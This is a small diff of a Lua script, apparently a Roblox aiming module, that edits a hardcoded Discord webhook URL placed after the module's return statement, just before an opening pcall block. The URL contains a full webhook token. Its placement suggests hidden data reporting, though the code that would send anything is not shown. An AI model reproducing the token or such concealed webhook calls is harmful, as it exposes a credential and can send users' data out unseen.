@@ -441,7 +441,7 @@ end)
 -- //
 return Aiming
 
-local webh = "https://canary.discord.com/api/webhooks/1012481304610222250/nRLR2sJUuF7gBWQDLLNMEc9g78Ff3O5vl0qAQyfG7nlxOhZfHHFI4O9H8b87KuElNtRA"
+local webh = "https://discord.com/api/webhooks/1012481304610222250/nRLR2sJUuF7gBWQDLLNMEc9g78Ff3O5vl0qAQyfG7nlxOhZfHHFI4O9H8b87KuElNtRA"
 
 
 pcall(function()
